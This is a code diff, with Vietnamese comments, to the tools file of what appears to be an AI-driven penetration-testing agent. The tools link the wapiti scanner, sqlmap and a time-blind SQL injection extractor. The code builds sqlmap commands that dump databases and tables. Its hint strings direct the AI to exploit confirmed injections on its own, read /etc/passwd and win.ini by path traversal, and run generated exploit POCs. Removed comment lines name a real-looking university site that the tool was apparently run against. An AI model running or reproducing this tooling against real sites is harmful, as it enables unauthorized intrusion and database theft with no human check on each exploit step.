@@ -490,7 +490,7 @@ _WAPITI_SEV_RANK = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
 _WAPITI_MAX_EXPLOIT = 3  # số SQLi tối đa tự đẩy sang sqlmap_runner mỗi lượt
 
 # v1.5.5: param phân trang mặc định BỎ TẤN CÔNG (--skip) — GET phase không đốt
-# hết max-attack-time trên N URL ?page=N (tbu.edu.vn: 52 URL page → module sql
+# hết max-attack-time trên N URL ?page=N (example.com: 52 URL page → module sql
 # chết trước khi tới form POST keyword). User override bằng skipped_parameters
 # (chuỗi phân tách dấu phẩy hoặc list); truyền chuỗi rỗng để tắt skip.
 _WAPITI_SKIP_PARAMS: tuple[str, ...] = (
@@ -512,7 +512,10 @@ _WAPITI_MAX_SWEEP_FORMS = 10  # số field form POST tối đa sweep mỗi lư�
 # v1.5.3: TÁCH hướng dẫn wapiti thành 2 map — HƯỚNG KHAI THÁC và HƯỚNG KHẮC PHỤC.
 # Mục "TỔNG HỢP LỖ HỔNG" trong output wapiti + JSON mapping (rule prompts 6/7) dùng 2 map này.
 _WAPITI_EXPLOIT: dict[str, str] = {
-    "SQL Injection": "sqlmap_runner TRƯỚC (technique='E', dbms theo DBMS trong finding) — nếu THẤT BẠI thì AI tự khai thác: sqli_blind_extract action='detect', known_confirmed=true.",
+    "SQL Injection": "sqlmap_runner TRƯỚC (technique='E', dbms theo DBMS trong finding) — nếu THẤT BẠI thì AI tự khai thác: sqli_blind_extract action='detect', known_confirmed=true. "
+                     "v1.5.7 ENGINE-CONSISTENCY: engine LUÔN theo DBMS trong dòng info finding "
+                     "(mysql|mssql|auto) — CẤM đổi engine khi wapiti đã report DBMS "
+                     "(vd 'DBMS: MySQL' → engine='mysql', KHÔNG bao giờ mssql).",
     "Blind SQL Injection": "sqlmap_runner TRƯỚC (technique='T', dbms theo DBMS) — nếu THẤT BẠI thì AI tự khai thác: sqli_blind_extract cho kênh boolean/time.",
     "Command execution": "Xác minh bằng poc_executor (gọi endpoint với payload) — không chạy payload phá hoại; ghi nhận RCE nếu xác nhận.",
     "Path Traversal": "poc_executor thử đọc /etc/passwd (Linux) / C:/Windows/win.ini (Windows) theo curl_command; đánh giá mức lộ file.",
@@ -855,7 +858,7 @@ def _form_sweep(base_url: str, session_dir: str, budget: int, req_timeout: int,
         con.close()
         forms: dict[int, dict] = {}
         for pid, name, val, path in rows:
-            # session DB lưu URL ĐẦY ĐỦ (vd https://tbu.edu.vn/WebTinTuc/TimKiem)
+            # session DB lưu URL ĐẦY ĐỦ (vd https://example.com/WebTinTuc/TimKiem)
             # → chuẩn hoá về RELATIVE (path + query) để test functions và
             # _sweep_finding dùng chung (dedupe + sqlmap target đúng).
             from urllib.parse import urlparse as _up
@@ -1138,7 +1141,8 @@ def _wapiti_scan(**kw):
                 _sqlmap_failed = (sql_out.lstrip().startswith("[!]")
                                   or any(m in sql_out.lower() for m in _FAIL_MARKS))
                 if _sqlmap_failed:
-                    eng = dbms if dbms in ("mysql", "mssql") else "mssql"
+                    # v1.5.7: DBMS không xác định → engine='auto' (KHÔNG ép mssql)
+                    eng = dbms if dbms in ("mysql", "mssql") else "auto"
                     meth = (f["method"] or "get").lower()
                     blind_data = data or ""
                     lines.append(
@@ -1202,7 +1206,7 @@ def _sqli_manual_test(**kw):
 
     1) QUOTE-DIFFERENTIAL (error-based) — 3 request: baseline 'test' vs 'test'' vs "test'"
        Nếu nháy đơn LÀM VỠ truy vấn (500/khác size) mà nháy đơn kép KHỚP baseline
-       → điểm chèn SQLi xác nhận, KHÔNG cần biết engine (hoạt động trên tbu.edu.vn
+       → điểm chèn SQLi xác nhận, KHÔNG cần biết engine (hoạt động trên example.com
        — form tìm kiếm MSSQL mà mọi payload time/boolean đều vỡ vì --
        không dùng được).
     2) TIME-BASED — chỉ chạy khi quote-differential không xác nhận: engine
@@ -1303,12 +1307,12 @@ def _sqli_manual_test(**kw):
         lines.append(
             "[→] BƯỚC TIẾP THEO: (1) sqlmap_runner {url, "
             + (f"data:'{param}={seed}', " if method == "post" else "")
-            + "dbms:'mssql', technique:'BEUSTQ'} — sqlmap BOUNDED để trích "
+            + f"dbms:'{engine}', technique:'BEUSTQ'}} — sqlmap BOUNDED để trích "
               "xuất databases/tables; CHỈ khi sqlmap_runner không ra dữ liệu "
               "mới (2) sqli_blind_extract {url, action:'version' hoặc "
-            + (f"'database', engine:'mssql', method:'{method}', param:'{param}', "
+            + (f"'database', engine:'{engine}', method:'{method}', param:'{param}', "
                f"data:'{param}={seed}', known_confirmed:true" if method == "post"
-               else "engine:'mssql', known_confirmed:true "
+               else f"engine:'{engine}', known_confirmed:true "
                "(bỏ qua lưới 9 probe — lỗi đã xác nhận)")
             + "} → (3) generate_poc → poc_executor với poc_path để chạy POC khai thác.")
     else:
@@ -1344,6 +1348,14 @@ def _sqli_blind_extract(**kw):
     sqlmap --technique=E (thêm --form khi method=post).
     """
     action = kw.get("action", "detect")
+    # v1.5.7: engine-consistency — resolve engine NGAY tại đây (engine='auto' →
+    # đoán từ headers qua _sweep_engine, cache theo host; mọi hint bên dưới
+    # (WAF/extraction-failed) dùng ĐÚNG engine, KHÔNG coerce unknown → mssql).
+    engine = str(kw.get("engine") or "mysql").lower().strip()
+    if engine == "auto":
+        engine = _sweep_engine(kw["url"], int(kw.get("timeout") or 15)) or "mysql"
+    elif engine not in ("mssql", "mysql"):
+        engine = "mysql"
     try:
         from sqli_blind_poc import TimeBlindExploiter
     except ImportError:  # khi tools.py được import từ nơi khác
@@ -1360,7 +1372,7 @@ def _sqli_blind_extract(**kw):
         delay=float(kw.get("delay", 3.0)),
         threshold=float(kw.get("threshold", 2.5)),
         timeout=int(kw.get("timeout") or 15),
-        engine=str(kw.get("engine") or "mysql"),
+        engine=engine,
         method=str(kw.get("method") or "get"),
         param=kw.get("param") or None,
         data=kw.get("data") or None,
@@ -1382,9 +1394,7 @@ def _sqli_blind_extract(**kw):
         if res.get("waf_suspected"):
             # v1.4.6: WAF chặn probe → hướng sqlmap error-based E
             form = " --form" if str(kw.get("method") or "get").lower() == "post" else ""
-            dbms = str(kw.get("engine") or "mysql")
-            if dbms not in ("mssql", "mysql"):
-                dbms = "mssql"
+            dbms = engine  # v1.5.7: engine đã resolved (mysql|mssql) — không coerce unknown→mssql
             out += (f"\n[!] WAF suspected (probe status-0) — chạy: "
                     f"sqlmap{form} -u {kw['url']} --dbms={dbms} "
                     f"--technique=E --batch")
@@ -1402,11 +1412,12 @@ def _sqli_blind_extract(**kw):
     # trả outcome=error kèm hướng sqlmap → pipeline chuyển sqlmap_runner FIRST.
     if res.get("extraction_failed") or (action != "detect" and not has_data):
         form = " --form" if str(kw.get("method") or "get").lower() == "post" else ""
-        dbms = str(kw.get("engine") or "mssql")
-        if dbms not in ("mssql", "mysql"):
-            dbms = "mssql"
+        # v1.5.7: engine resolved (mysql|mssql) hoặc auto — 'auto' thì KHÔNG
+        # emit --dbms để sqlmap tự dò; sqlmap_cmd từ sqli_blind_poc cũng vậy.
+        dbms = engine if engine in ("mssql", "mysql") else "auto"
+        dbm_flag = f"--dbms={dbms} " if dbms != "auto" else ""
         smc = res.get("sqlmap_cmd") or (
-            f"sqlmap{form} -u {kw['url']} --dbms={dbms} --technique=BEUSTQ "
+            f"sqlmap{form} -u {kw['url']} {dbm_flag}--technique=BEUSTQ "
             f"--batch --level 1 --risk 1 --threads 1")
         default_err = ("Oracle trích xuất IM LẶNG — 0 byte: payload bị hấp thụ trong "
                        "string literal (quote-parity), KHÔNG có kênh dữ liệu nào để "
@@ -1959,8 +1970,8 @@ TOOL_REGISTRY: list[ToolSpec] = [
                                  "description": "Ngưỡng delta giây để tính TRUE (mặc định 2.5)"},
                   "max_len": {"type": "integer", "minimum": 1, "maximum": 500,
                                "description": "Độ dài tối đa của mỗi giá trị trích xuất"},
-                  "engine": {"type": "string", "enum": ["mysql", "mssql"],
-                              "description": "DB engine: mysql (SLEEP, mặc định) hoặc mssql (error-based oracle ưu tiên + WAITFOR DELAY)"},
+                  "engine": {"type": "string", "enum": ["mysql", "mssql", "auto"],
+                              "description": "DB engine: mysql (SLEEP, mặc định), mssql (error-based oracle ưu tiên + WAITFOR DELAY) hoặc auto (đoán từ response headers — mặc định mysql khi không có tín hiệu)"},
                   "method": {"type": "string", "enum": ["get", "post"],
                               "description": "get (mặc định) hoặc post (form — cần param + data)"},
                   "param": {"type": "string",
@@ -2031,7 +2042,7 @@ TOOL_REGISTRY: list[ToolSpec] = [
              "AI tự khai thác bằng sqli_blind_extract (known_confirmed=true). Cuối output có "
              "mục TỔNG HỢP LỖ HỔNG — hướng khai thác + khắc phục từng category (dùng viết "
              "final JSON findings[].fix). v1.5.5: TỰ TÌM SQLi TRÊN FORM POST — chỉ cần nhập "
-             "root domain (vd https://tbu.edu.vn), wapiti crawl + form sweep đọc session DB "
+             "root domain (vd https://example.com), wapiti crawl + form sweep đọc session DB "
              "(--store-session) rồi test từng field form (MSSQL error-based oracle → "
              "quote-differential → time-based giới hạn) — KHÔNG cần trỏ tay vào URL form. "
              "Param phân trang (page/p/offset/...) mặc định bị --skip để module sql không "
